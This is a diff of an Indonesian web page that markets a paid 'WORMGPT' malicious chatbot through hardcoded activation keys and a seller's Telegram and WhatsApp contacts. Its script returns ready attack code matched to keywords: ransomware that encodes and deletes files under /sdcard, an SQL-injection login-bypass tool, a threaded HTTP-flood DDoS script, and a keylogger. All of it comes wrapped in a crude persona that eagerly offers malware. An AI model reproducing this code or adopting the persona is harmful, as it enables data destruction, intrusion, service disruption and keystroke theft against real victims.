@@ -1,109 +1,275 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <title>XIOLIM WORMGPT</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XIOLIM WORMGPT | Dark AI</title>
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Courier New', monospace;
+        }
         body {
-            background: black;
-            color: #00ff00;
-            font-family: monospace;
+            background: #0a0f0f;
+            color: #00ff9d;
             padding: 20px;
         }
         .container {
-            max-width: 800px;
+            max-width: 1200px;
             margin: 0 auto;
+            background: rgba(0,0,0,0.8);
+            border: 1px solid #00ff9d;
+            border-radius: 12px;
+            padding: 20px;
         }
-        .chat {
-            background: #0a0a0a;
-            border: 1px solid #00ff00;
-            height: 400px;
-            overflow-y: auto;
+        h1 {
+            border-bottom: 1px dashed #00ff9d;
+            display: inline-block;
+            margin-bottom: 20px;
+        }
+        .status {
+            background: #051010;
             padding: 10px;
             margin: 20px 0;
+            border-left: 3px solid #00ff9d;
+        }
+        .chat {
+            background: #051010;
+            height: 400px;
+            overflow-y: auto;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 8px;
+        }
+        .msg {
+            margin: 10px 0;
+            padding: 8px;
+        }
+        .bot {
+            color: #00ffaa;
+            border-left: 2px solid #00ff9d;
+        }
+        .user {
+            color: #ffaa00;
+            text-align: right;
         }
         input, button {
             background: black;
-            border: 1px solid #00ff00;
-            color: #00ff00;
-            padding: 10px;
+            border: 1px solid #00ff9d;
+            color: #00ff9d;
+            padding: 12px;
             margin: 5px;
+            font-size: 16px;
         }
-        input { width: 70%; }
-        .msg { margin: 10px 0; }
-        .bot { color: #00ffaa; }
-        .user { color: #ffaa00; }
+        input {
+            width: calc(70% - 10px);
+        }
+        button {
+            width: calc(30% - 10px);
+            cursor: pointer;
+            font-weight: bold;
+        }
+        button:hover {
+            background: #00ff9d22;
+        }
+        .buy-btn {
+            background: #ff000022;
+            border-color: #ff4444;
+            color: #ff8888;
+        }
+        pre {
+            background: #001010;
+            padding: 10px;
+            overflow-x: auto;
+            margin-top: 10px;
+            border-radius: 5px;
+        }
+        @media (max-width: 600px) {
+            input, button { width: 100%; margin: 5px 0; }
+        }
     </style>
 </head>
 <body>
 <div class="container">
-    <h1>🐍 XIOLIM WORMGPT</h1>
-    <p>🔒 <span id="status">BELUM AKTIVASI</span></p>
+    <h1>🐍 XIOLIM<span style="color:#ff4444">WORMGPT</span></h1>
+    <p>Exploit · Malware · Virus · Zero-Day</p>
     
-    <div class="chat" id="chat">
-        <div class="msg bot">💀 Hallo, beli kode aktivasi dulu. Chat @limprincee atau WA 082385106077</div>
+    <div class="status" id="statusMsg">
+        🔒 STATUS: BELUM AKTIVASI
     </div>
     
-    <input type="text" id="keyInput" placeholder="Masukkan kode aktivasi">
-    <button id="activateBtn">AKTIVASI</button>
-    <button id="buyBtn" onclick="window.location.href='license.html'">💸 BELI KODE</button>
+    <div class="chat" id="chatArea">
+        <div class="msg bot">🤖 XIOLIM: 💀 Hai kontol. Beli kode aktivasi dulu. Chat Telegram @limprincee atau WA 082385106077</div>
+    </div>
     
-    <hr>
-    <input type="text" id="prompt" placeholder="Prompt..." disabled>
-    <button id="sendBtn" disabled>KIRIM</button>
+    <div>
+        <input type="text" id="activationKey" placeholder="Masukkan kode aktivasi...">
+        <button id="activateBtn">🔓 AKTIVASI</button>
+        <button id="buyBtn" class="buy-btn">💸 BELI KODE</button>
+    </div>
+    
+    <hr style="border-color:#00ff9d33; margin: 20px 0;">
+    
+    <div>
+        <input type="text" id="promptInput" placeholder="Ketik prompt (contoh: bikin ransomware)..." disabled>
+        <button id="sendBtn" disabled>🚀 KIRIM</button>
+    </div>
 </div>
 
 <script>
-    let isActive = false;
+    // KONFIGURASI
+    const VALID_KEYS = ["WORM-9999-ABCD", "WORM-8888-EFGH", "XIOLIM-ULTIMATE-001"];
+    let isActivated = false;
     
-    document.getElementById("activateBtn").onclick = () => {
-        let key = document.getElementById("keyInput").value;
-        let validKeys = ["WORM-9999-ABCD", "WORM-8888-EFGH"];
-        
-        if(validKeys.includes(key)) {
-            isActive = true;
-            document.getElementById("status").innerHTML = "✅ AKTIF 999999 HARI";
-            document.getElementById("prompt").disabled = false;
-            document.getElementById("sendBtn").disabled = false;
-            addMessage("bot", "🎉 Aktivasi sukses! Lo mau bikin apa? (virus, malware, exploit)");
-        } else {
-            addMessage("bot", "❌ Kode salah! Beli di @limprincee atau WA 082385106077");
-        }
-    };
+    // ELEMEN
+    const statusMsg = document.getElementById('statusMsg');
+    const chatArea = document.getElementById('chatArea');
+    const activationKey = document.getElementById('activationKey');
+    const activateBtn = document.getElementById('activateBtn');
+    const buyBtn = document.getElementById('buyBtn');
+    const promptInput = document.getElementById('promptInput');
+    const sendBtn = document.getElementById('sendBtn');
     
-    document.getElementById("sendBtn").onclick = async () => {
-        if(!isActive) return;
-        let prompt = document.getElementById("prompt").value;
-        if(!prompt) return;
-        
-        addMessage("user", prompt);
-        document.getElementById("prompt").value = "";
-        
-        // Simulasi AI (karena API key bermasalah, pake lokal dulu)
-        let response = "💀 " + generateLocalResponse(prompt);
-        addMessage("bot", response);
-    };
-    
-    function generateLocalResponse(prompt) {
-        let p = prompt.toLowerCase();
-        if(p.includes("virus") || p.includes("malware")) {
-            return `RANSOMWARE SEDERHANA:\n\`\`\`python\nimport os\nfor file in os.listdir():\n    if file.endswith('.txt'):\n        os.rename(file, file+'.locked')\nprint('File terkunci! Hubungi @limprincee')\n\`\`\``;
-        } else if(p.includes("exploit")) {
-            return `SQL INJECTION:\n\`\`\`python\npayload = "' OR '1'='1' -- "\nurl = "http://target.com/login"\nrequests.post(url, data={'user':payload, 'pass':'x'})\n\`\`\``;
-        } else {
-            return `Gw bisa bikin: virus, malware, exploit, backdoor, DDoS. Contoh: "bikin ransomware" atau "exploit login admin"`;
-        }
-    }
-    
+    // FUNGSI ADD PESAN
     function addMessage(sender, text) {
-        let chat = document.getElementById("chat");
-        let div = document.createElement("div");
+        const div = document.createElement('div');
         div.className = `msg ${sender}`;
-        div.innerHTML = sender === "bot" ? `🤖 ${text}` : `🧑 ${text}`;
-        chat.appendChild(div);
-        chat.scrollTop = chat.scrollHeight;
+        div.innerHTML = sender === 'bot' ? `🤖 XIOLIM: ${text}` : `🧑‍💻 ANDA: ${text}`;
+        chatArea.appendChild(div);
+        chatArea.scrollTop = chatArea.scrollHeight;
     }
+    
+    // GENERATE RESPON LOKAL (karena API key publik bermasalah)
+    function generateResponse(prompt) {
+        const p = prompt.toLowerCase();
+        
+        if (p.includes('virus') || p.includes('malware') || p.includes('ransom')) {
+            return `💀 RANSOMWARE SEDERHANA (EDUKASI):\n\n<pre><code>
+import os
+import base64
+
+def encrypt_files():
+    for root, dirs, files in os.walk("/sdcard"):
+        for file in files:
+            if file.endswith((".txt", ".jpg", ".png")):
+                path = os.path.join(root, file)
+                with open(path, "rb") as f:
+                    data = f.read()
+                encrypted = base64.b64encode(data)
+                with open(path + ".encrypted", "wb") as f:
+                    f.write(encrypted)
+                os.remove(path)
+    print("SEMUA FILE TERENKRIPSI! Hubungi @limprincee")
+
+if __name__ == "__main__":
+    encrypt_files()
+</code></pre>\n\n⚠️ JALANKAN DI LAB SENDIRI, BUKAN DI HP ORANG LAIN!`;
+        }
+        
+        if (p.includes('exploit') || p.includes('sql') || p.includes('injection')) {
+            return `💀 SQL INJECTION EXPLOIT TOOL:\n\n<pre><code>
+import requests
+
+target = input("URL target (contoh: http://test.com/login.php): ")
+payloads = ["' OR '1'='1' -- ", "admin' -- ", "' OR 1=1 -- "]
+
+for payload in payloads:
+    data = {"username": payload, "password": "x"}
+    try:
+        r = requests.post(target, data=data, timeout=5)
+        if "dashboard" in r.text.lower() or "welcome" in r.text.lower():
+            print(f"✅ VULNERABLE! Payload: {payload}")
+            break
+    except:
+        pass
+else:
+    print("❌ Tidak ditemukan celah")
+</code></pre>\n\n🔧 GUNAKAN UNTUK TESTING WEBSITE SENDIRI!`;
+        }
+        
+        if (p.includes('ddos') || p.includes('flood')) {
+            return `💀 SCRIPT DDOS SEDERHANA (EDUKASI):\n\n<pre><code>
+import threading
+import requests
+
+url = input("Target URL: ")
+
+def attack():
+    while True:
+        try:
+            requests.get(url)
+            print("Attack sent!")
+        except:
+            pass
+
+for i in range(100):
+    threading.Thread(target=attack).start()
+</code></pre>\n\n⚠️ JANGAN PAKAI UNTUK SERANG SITUS ORANG!`;
+        }
+        
+        if (p.includes('keylogger')) {
+            return `💀 KEYLOGGER PYTHON (EDUKASI):\n\n<pre><code>
+from pynput.keyboard import Listener
+
+def log(key):
+    key = str(key).replace("'", "")
+    with open("log.txt", "a") as f:
+        f.write(key + "\\n")
+
+with Listener(on_press=log) as listener:
+    listener.join()
+</code></pre>\n\n📌 Install: pip install pynput`;
+        }
+        
+        return `💀 XIOLIM WORMGPT SIAP MELAYANI!\n\nGw bisa bikin:\n• Ransomware / Malware\n• SQL Injection Exploit\n• DDoS Script\n• Keylogger\n• Reverse Shell\n• Backdoor\n\nContoh prompt:\n"bikin ransomware python"\n"exploit sql injection"\n"ddos script"\n\nKetik aja, gas! 🔥`;
+    }
+    
+    // AKTIVASI
+    activateBtn.onclick = () => {
+        const key = activationKey.value.trim();
+        
+        if (VALID_KEYS.includes(key)) {
+            isActivated = true;
+            statusMsg.innerHTML = '✅ STATUS: AKTIF — 999999 HARI 🔥';
+            statusMsg.style.color = '#00ffaa';
+            promptInput.disabled = false;
+            sendBtn.disabled = false;
+            addMessage('bot', '🎉 AKTIVASI SUKSES, KONTOL! 🎉\n\nSekarang lo bisa minta virus, malware, exploit, dll. Coba ketik: "bikin ransomware"');
+        } else {
+            addMessage('bot', '❌ KODE INVALID, KONTOL! Beli dulu di Telegram @limprincee atau WA 082385106077');
+        }
+    };
+    
+    // BELI KODE
+    buyBtn.onclick = () => {
+        addMessage('bot', '📱 HUBUNGI ADMIN:\n\n📨 Telegram: @limprincee\n💬 WhatsApp: 082385106077\n\nBayar MANUAL, nanti dikasih kode aktivasi.\n\n🔑 KODE DEMO (testing): WORM-9999-ABCD');
+    };
+    
+    // KIRIM PESAN
+    sendBtn.onclick = () => {
+        if (!isActivated) {
+            addMessage('bot', '⚠️ Belum aktivasi, kontol! Masukkan kode dulu.');
+            return;
+        }
+        
+        const prompt = promptInput.value.trim();
+        if (!prompt) return;
+        
+        addMessage('user', prompt);
+        promptInput.value = '';
+        
+        const response = generateResponse(prompt);
+        addMessage('bot', response);
+    };
+    
+    // ENTER UNTUK KIRIM
+    promptInput.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter' && isActivated && promptInput.disabled === false) {
+            sendBtn.click();
+        }
+    });
 </script>
 </body>
 </html>
